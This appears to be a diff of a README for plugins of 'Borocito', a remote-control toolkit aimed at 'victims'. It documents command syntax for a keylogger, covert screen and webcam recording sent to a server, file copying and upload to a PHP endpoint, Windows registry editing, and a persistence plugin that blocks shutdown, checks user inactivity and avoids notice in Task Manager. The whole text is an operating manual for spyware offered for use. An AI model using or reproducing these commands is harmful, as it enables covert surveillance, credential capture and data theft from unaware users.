@@ -22,6 +22,8 @@ Also, if you want my server to provide you with the repository, you must modify 
 I really recommend you use my repository, upload updates with improvements, etc. So you avoid having to update your repository.  
 
 **Remember: it's just a repository. I can not steal the victims and either receive files either. It's just read-only**  
+
+---
 ### boro-get
 This must be installed, by default it is not implemented. It should be installed using the command `boro-get install`, to check if it is installed or not, use `boro-get status`, if it is already installed, great!  
 Now, if you want to be sure the latest version is installed, use `boro-get uninstall`, that will uninstall boro-get. Then you can use the `boro-get install` command to download and install the latest version available on the server indicated in the file: GlobalSettings.ini and the file boro-get.txt thats inside boro-get.zip file (/Boro-Get/boro-get.zip)  
@@ -55,17 +57,71 @@ Now we are going to define a concept.
 These are designed to do unique unrepeatable things. Like a keylogger. This is something global, why another instance?  
 Also, they can receive parameters when they are already started, so you can control them.  
 
+---
 ### boro-hear
 boro-hear is a module that allows plugins to communicate (one-way C->S) with the Control Panel.  
 
-If you make a plugin, you can make it send messages to the control panel. In your code you should put something like [this code](https://github.com/Zhenboro/borocito-components/blob/e7eda70b99cfcfa2ea3a66223cc3564703051f29/broKiloger/Utility.vb#L8-L51).  
+If you make a plugin, you can make it send messages to the control panel. In your code you should put something like [this code](https://github.com/Zhenboro/borocito-components/blob/33632ac2104ceabbc001c9de55fb82cf519842f8/boro-get/Utility.vb#L40-L57).  
 That will start an instance of boro-hear which will send your message to the server. boro-hear is single-instance, but messages can be sent by passing parameters to it. These are picked up by boro-hear via the StartUpNextInstance event.  
 
-
+---
 ### broEstoraje
-It is used to explore files. Basically [RMTFS](https://github.com/Zhenboro/RMTFS) adapted to work with FTP (or IDFTP).  
+It is used to perform typical operations of a FileSystem, delete, move, copy, rename and compress in zip.  
+**Compress a folder:**  
+```sh
+/ZipToDir <folderPath> <zipFilePath(must include extencion)>  
+```
+Example: /ZipToDir C:\Users\Zhenboro\Desktop C:\Users\Zhenboro\Escroto.zip  
 
+---
+**Decompress zip to folder:**  
+```sh
+/ZipToDir <zipPath> <dirPath>  
+```
+Example: /ZipToDir C:\Users\Zhenboro\Escroto.zip C:\Users\Zhenboro\Desktop  
 
+---
+**Rename:**  
+```sh
+/RenameFile <filePath> <newName>  
+```
+Example: /RenameFile C:\Users\Zhenboro\Escroto.zip Escritorio.zip  
+```sh
+/RenameDirectory <folderPath> <newName>  
+```
+Example: /RenameDirectory C:\Users\Zhenboro\Carpeta0 Carpeta1  
+
+---
+**Copy:**  
+```sh
+/CopyFile <filePath> <newFilePath>  
+```
+Example: /CopyFile C:\Users\Zhenboro\Escroto.zip C:\Users\Zhenboro\Copia.zip  
+```sh
+/CopyDirectory <folderPath> <newName>  
+```
+Example: /CopyDirectory C:\Users\Zhenboro\Carpeta0 C:\Users\Zhenboro\Carpeta1  
+
+---
+**Move:**  
+```sh
+/MoveFile <filePath> <newFilePath>  
+```
+Example: /MoveFile C:\Users\Zhenboro\Escritorio.zip C:\Users\Zhenboro\Desktop\Escritorio.zip
+```sh
+/MoveDirectory <folderPath> <newFolderPath>  
+```
+Example: /MoveDirectory C:\Users\Zhenboro\Carpeta0 C:\Users\Zhenboro\Desktop\Carpeta0  
+
+---
+**Upload:**  
+Just like the `/Payloads.Upload.File=<filepath>,<null, phpPost>` command. you can upload a file to the server.  
+```sh
+/Upload <filePath> 
+```
+It will be sent to the php fileUpload on the server  
+
+---
 ### broKiloger
 broKiloger is a plugin dedicated to logging keys.  
 
@@ -98,9 +154,12 @@ boro-get broKiloger True /resetrecord
 boro-get broKiloger True /sendandexit
 ```  
 
-Can't undestand a shit? [Key mapping for broKiloger keylog](https://chemic-jug.000webhostapp.com/Borocito/Mapeo_Teclas_Kiloger.txt)
+Can't undestand a shit? [Key mapping for broKiloger keylog](https://chemic-jug.000webhostapp.com/Borocito/Mapeo_Teclas_Kiloger.txt)  
 
+---
 ### broRescue
+> NOTE: Single Instance Package  
+
 This plugin was created because it turns out that sometimes an instance of BorocitoCLI can be closed by some external or internal factor. Perhaps the user noticed the presence and closed it, or, a command left a mess that BorocitoCLI couldn't handle.  
 For this reason, broRescue is a good recommendation that it be installed.  
 **And what does it do?**  
@@ -114,61 +173,197 @@ Or even restart the computer with the command:
 `broRescue Restart`  
 And, you can also try to prevent the computer from being turned off. with `broRescue NoShutdown` to avoid or, `YesShutdown` to not try to avoid.  
 This packet reads directly from the server. Every 5 minutes. So yes, you will notice the effect in 5 minutes. And that is done so as not to load the server, and also so that it is not noticed from the task manager.  
+**You can also get the number of seconds since the user's last activity with the command:**  
+```sh
+/GetAFK
+```
+Example:  
+```sh
+boro-get broRescue True /GetAFK
+```
+Data returned *(boro-hear must be installed)* 
+*The response is immediate (not 5 minutes later)*
+```sh
+Return
+	uInteger
+		(in seconds)
+Example
+	60
+		(1min (60sec) of inactivity)
+	0
+		(0s of inactivity. The user is active)
+```  
 
 This comp will start with windows.  
 
+---
 ### broScrincam
+> NOTE: Single Instance Package  
 
 This plugin is for:  
 - Take photos from a Webcam (not coded yet)  
 - Record video from a Webcam (not coded yet)  
-- Record screen  
-
-> NOTE: Single Instance Package  
+- Record screen (it should work)  
+*The function to record the screen should work, but in my case the server does NOT allow uploading the recording file because it is very large*  
 
 ```sh
 /startscreenrecording: Will start to record the screen.
 boro-get broScrincam True /startscreenrecording
 ```  
-
+---
 ```sh
 /stopscreenrecording: It is supposed to stop screen recording. 
 boro-get broScrincam True /stopscreenrecording
 ```  
 > NOTE: It will not save or send the record.
-
+---
 ```sh
 /sendscreenrecord: It stop, save and send the screen recording.
 boro-get broScrincam True /sendscreenrecord
 ```  
-
+---
 ```sh
 /startcamrecording: It will start to record video from the webcam
 boro-get broScrincam True /startcamrecording
 ```  
-
+---
 ```sh
 /takecampicture: It will take a screenshot of the webcam
 boro-get broScrincam True /takecampicture
 ```  
 > NOTE: It will be sent automatically.  
-
+---
 ```sh
 /stopcamrecording: It will stop the Webcam recording.
 boro-get broScrincam True /stopcamrecording
 ```  
 > NOTE: It will not save or send the record.  
-
+---
 ```sh
 /sendcamrecord: It will stop the Webcam recording and send it automatically.
 boro-get broScrincam True /sendcamrecord
 ```
 > NOTE: It will be sent automatically.
-
+---
 ```sh
 /stop: It will send the keylogger and then start recording again.
 boro-get broScrincam True /stop
 ```
+---
+### broReedit
+This complement allows you to modify the Windows Registry.
+> NOTE: Single Instance Package  
+---
+To select a "Hive":  
+```sh
+/selecthk <hive>
+```
+Hives:  
+- ClassesRoot
+- CurrentConfig
+- CurrentUser
+- LocalMachine
+- PerformanceData
+-  Users
+
+Example:  
+```sh
+/selecthk CurrentUser
+```
+---
+To select a SubKey:  
+```sh
+/selectkey <subkey>
+```
+Example:  
+```sh
+/selecthk SOFTWARE\Borocito
+```
+---
+To get a value:  
+```sh
+/getvalue <valueName>
+```
+Example:  
+```sh
+/getvalue OwnerServer
+```
+---
+To set a value:  
+```sh
+/setvalue <valueName> <value> <valueKind>
+```
+See types in [RegistryValueKind Enum (Microsoft.Win32) | Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/api/microsoft.win32.registryvaluekind?msclkid=cb066977c71011ecb24bd53c4a938a9b&view=net-6.0)
+Example:  
+```sh
+/setvalue OwnerServer http://.../ 1
+```
+If you set null in valueKind then will be 1 (String)
+
+---
+To delete a value:  
+```sh
+/deletevalue <valueName>
+```
+Example:  
+```sh
+/deletevalue OwnerServer
+```
+---
+To get a value names:  
+```sh
+/getvaluenames()
+```
+Return:  
+```sh
+	OwnerServer
+	UID
+	(etc...)
+```
+---
+To get a value kind:  
+```sh
+/getvaluekind <valueName>
+```
+Example:  
+```sh
+	/getvaluekind OwnerServer
+```
+Return:  
+```sh
+	1
+```
+See types in [RegistryValueKind Enum (Microsoft.Win32) | Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/api/microsoft.win32.registryvaluekind?msclkid=cb066977c71011ecb24bd53c4a938a9b&view=net-6.0)
+
+---
+To create a SubKey:  
+```sh
+/createsubkey <subKeyName>
+```
+Example:  
+```sh
+/createsubkey Backup
+```
+---
+To delete a subkey:  
+```sh
+/deletesubkey <subkeyName>
+```
+Example:  
+```sh
+/deletesubkey boro-get
+```
+---
+To delete a subkey tree:  
+```sh
+/deletesubkeytree <subkeyName>
+```
+Example:  
+```sh
+/deletesubkeytree boro-get
+```
+(Will remove all subkeys hanging from the "boro-get" key)
+
 
 ## Uninstalling a package
 To uninstall, remove a package, the following points must be taken into account.
@@ -180,5 +375,6 @@ To uninstall, use the `boro-get <package> uninstall` command.
 An example with broKiloger would be:  
 `boro-get broKiloger uninstall`  
 
+---
 ### WARNING
 **The plugins created are not perfect. I recommend you take a look at the code to know what it does and how it does it, so you avoid unpredictable behavior or bad practices.**
